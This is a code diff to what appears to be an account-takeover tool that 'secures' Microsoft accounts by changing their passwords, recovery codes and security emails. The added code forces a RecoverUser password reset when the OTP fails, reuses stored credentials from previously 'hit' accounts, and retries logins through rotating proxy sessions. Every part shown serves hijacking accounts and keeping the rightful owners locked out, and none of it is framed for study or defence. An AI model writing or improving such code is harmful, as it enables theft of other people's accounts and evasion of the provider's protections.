@@ -17,6 +17,7 @@ from securing.utils.secure import secure
 from securing.account_filters import rejection_reason
 from securing.utils.proxy import (
     close_session,
+    format_exception_reason,
     is_proxy_transport_error,
     run_with_proxy_retry,
 )
@@ -24,6 +25,7 @@ from securing.utils.proxy import (
 from database.database import DBConnection
 from time import time
 from typing import Awaitable, Callable
+import asyncio
 import logging
 import json
 import re
@@ -531,11 +533,11 @@ async def recovery_secure(
                 async def _otp_login(s):
                     import time as _time
 
-                    # Initial OTP request + one resend if mail is slow.
-                    # Longer waits — RecoverUser traffic often delays security mail.
-                    # Only after both waits miss do we fall back to password.
-                    max_otp_rounds = 2
-                    otp_timeout_s = 45
+                    # Initial OTP request + resends if mail is slow.
+                    # RecoverUser traffic often delays security-email delivery —
+                    # give it more time before falling back to password.
+                    max_otp_rounds = 3
+                    otp_timeout_s = 60
                     code = None
                     flowtoken = None
                     last_auth_error = None
@@ -647,13 +649,82 @@ async def recovery_secure(
                     if pwd_status == "bad" or "UNVERIFIED" in str(password):
                         logging.warning(
                             "OTP failed for %s and password is UNVERIFIED/bad — "
-                            "not attempting password login",
+                            "trying one RecoverUser password force before give-back",
                             email,
                         )
                         print(
                             "[!] - Security-email OTP failed; password verify was "
-                            f"{pwd_status} — returning creds (no password login)"
+                            f"{pwd_status} — forcing RecoverUser password retry…"
                         )
+                        try:
+                            from securing.utils.security.force_password import (
+                                force_password_after_recover,
+                                strip_unverified,
+                            )
+
+                            forced_pwd, forced_rc, forced_ok = await force_password_after_recover(
+                                session,
+                                email=email,
+                                security_email=security_email,
+                                recovery_code=new_recovery_code,
+                                preferred_password=strip_unverified(password),
+                                max_attempts=3,
+                            )
+                            if forced_rc:
+                                new_recovery_code = forced_rc
+                            if forced_pwd:
+                                password = forced_pwd
+                            if forced_ok:
+                                print(
+                                    "[+] - Forced password stuck after OTP failure — "
+                                    "retrying password login"
+                                )
+                                await close_session(session)
+                                session = get_session()
+
+                                async def _pwd_login_after_force(s):
+                                    return await _secure_after_password_login(
+                                        s,
+                                        email,
+                                        forced_pwd,
+                                        {
+                                            "security_email": security_email,
+                                            "password": forced_pwd,
+                                            "recovery_code": new_recovery_code,
+                                        },
+                                        elapsed=time() - initialTime,
+                                    )
+
+                                try:
+                                    account, session = await run_with_proxy_retry(
+                                        session,
+                                        _pwd_login_after_force,
+                                        new_session=get_session,
+                                        attempts=4,
+                                        rotate_ssid_after=2,
+                                        label="password-login-after-force",
+                                        email=email,
+                                    )
+                                    if isinstance(account, dict):
+                                        # Success or reject-with-creds — keep as-is
+                                        return account
+                                except Exception as force_login_exc:
+                                    logging.warning(
+                                        "password login after force failed for %s: %s",
+                                        email,
+                                        force_login_exc,
+                                    )
+                            else:
+                                password = f"{strip_unverified(password)} (UNVERIFIED — may not work)"
+                        except Exception as force_exc:
+                            logging.exception(
+                                "force_password_after_recover failed for %s", email
+                            )
+                            print(
+                                f"[X] - Force password retry failed "
+                                f"({force_exc.__class__.__name__})"
+                            )
+
                         return _failure_result(
                             email,
                             "Security-email OTP did not arrive and password did not "
@@ -758,7 +829,8 @@ async def recovery_secure(
                 logging.exception("recovery_secure rcode failed for %s", email)
                 if new_recovery_code:
                     # Surface a readable reason — never dump bare AttributeError.group
-                    reason = str(exc).strip() or exc.__class__.__name__
+                    # (httpx ReadTimeout often has empty str(exc) → blank Discord text)
+                    reason = format_exception_reason(exc)
                     where = ""
                     try:
                         import traceback as _tb
@@ -770,7 +842,7 @@ async def recovery_secure(
                         pass
                     if is_proxy_transport_error(exc):
                         reason = (
-                            f"Network/proxy error ({exc.__class__.__name__}). "
+                            f"Network/proxy error ({reason}). "
                             "Credentials above are valid — retry securing."
                         )
                     elif "has no attribute 'group'" in reason:
@@ -786,7 +858,7 @@ async def recovery_secure(
                         security_email=security_email,
                         password=password,
                         recovery_code=new_recovery_code,
-                        error=f"{exc.__class__.__name__}: {exc}",
+                        error=reason,
                         credentials_changed=True,
                     )
                 raise
@@ -848,14 +920,100 @@ async def recovery_secure(
                     return login_ok
 
                 print("[~] - Authenticator login OK — securing account…")
+                # Seed seller credentials so proofs MFA (i5600) can try password
+                # before recovery code / security email exist.
+                account["microsoft"]["password"] = seller_password
+                account["microsoft"]["auth_secret"] = auth_secret
+
+                # Re-secure of an already-hit account: seed prior RC / security
+                # email from DB. MS often blocks GetOneTimeCode on i5600 (203/204);
+                # having recovery lets secure() soft-skip proofs and still RecoverUser.
                 try:
-                    dsecured = await secure(
-                        session=session,
-                        recovery=True,
-                        account_info=account,
-                        command=True,
+                    with DBConnection() as database:
+                        prior = database.get_secured_account_by_email(email)
+                    if prior:
+                        ms = account["microsoft"]
+                        prior_rc = str(prior.get("recovery_code") or "").strip()
+                        prior_sec = str(prior.get("security_email") or "").strip()
+                        prior_pwd = str(prior.get("password") or "").strip()
+                        if prior_rc and prior_rc not in (
+                            "Couldn't Change!",
+                            "Failed to generate",
+                        ):
+                            ms["recovery_code"] = prior_rc
+                            print(
+                                f"[~] - Seeded prior recovery code from DB "
+                                f"({prior_rc[:8]}…)"
+                            )
+                        if prior_sec and "@" in prior_sec and prior_sec != "Couldn't Change!":
+                            ms["security_email"] = prior_sec
+                            print(f"[~] - Seeded prior security email from DB ({prior_sec})")
+                        # Seller TOTP password may be stale after a prior RecoverUser —
+                        # keep seller_password for login, but stash secured pwd for MFA.
+                        if prior_pwd and prior_pwd not in ("Couldn't Change!", "Unknown"):
+                            ms["secured_password"] = prior_pwd
+                except Exception:
+                    logging.exception(
+                        "authpwd: failed seeding prior secured creds for %s", email
                     )
-                except Exception as exc:
+
+                # Login already has proxy retry; secure() used to run once and soft-fail
+                # on the first ConnectError (Bamboozled sunny906 resubmit). Retry on the
+                # same session, then re-login on a fresh sticky SSID and try again.
+                dsecured = None
+                last_secure_exc: BaseException | None = None
+                secure_attempts = 4
+                for secure_try in range(1, secure_attempts + 1):
+                    try:
+                        if secure_try > 1:
+                            print(
+                                f"[!] - authpwd secure() retry {secure_try}/{secure_attempts}"
+                                " — fresh sticky + re-login…"
+                            )
+                            await close_session(session)
+                            session = get_session()
+                            login_ok, session = await run_with_proxy_retry(
+                                session,
+                                _totp_login,
+                                new_session=get_session,
+                                attempts=4,
+                                rotate_ssid_after=2,
+                                label="authpwd-relogin",
+                                email=email,
+                            )
+                            if isinstance(login_ok, dict) and login_ok.get("failed"):
+                                return login_ok
+                        dsecured = await secure(
+                            session=session,
+                            recovery=True,
+                            account_info=account,
+                            command=True,
+                        )
+                        last_secure_exc = None
+                        break
+                    except Exception as exc:
+                        last_secure_exc = exc
+                        if (
+                            is_proxy_transport_error(exc)
+                            and secure_try < secure_attempts
+                        ):
+                            logging.warning(
+                                "authpwd secure() %s for %s (attempt %s/%s) — retrying",
+                                exc.__class__.__name__,
+                                email,
+                                secure_try,
+                                secure_attempts,
+                            )
+                            print(
+                                f"[!] - authpwd secure() {exc.__class__.__name__} "
+                                f"({secure_try}/{secure_attempts}) — retrying…"
+                            )
+                            await asyncio.sleep(1.5 * secure_try)
+                            continue
+                        break
+
+                if last_secure_exc is not None:
+                    exc = last_secure_exc
                     logging.exception("authpwd secure() crashed for %s", email)
                     ms = (account.get("microsoft") or {})
                     primary = str(ms.get("email") or "").strip() or email
@@ -874,10 +1032,10 @@ async def recovery_secure(
                         )
                         or replaced
                     )
-                    reason = str(exc).strip() or exc.__class__.__name__
+                    reason = format_exception_reason(exc)
                     if is_proxy_transport_error(exc):
                         reason = (
-                            f"Network/proxy error ({exc.__class__.__name__}). "
+                            f"Network/proxy error ({reason}). "
                             "Retry securing — credentials may already have changed."
                         )
                     return _failure_result(
@@ -886,7 +1044,7 @@ async def recovery_secure(
                         security_email=ms.get("security_email") if creds_changed else None,
                         password=ms.get("password") if creds_changed else seller_password,
                         recovery_code=ms.get("recovery_code") if creds_changed else None,
-                        error=f"{exc.__class__.__name__}: {exc}",
+                        error=reason,
                         credentials_changed=creds_changed,
                         primary_email=primary,
                         primary_alias_replaced=replaced,
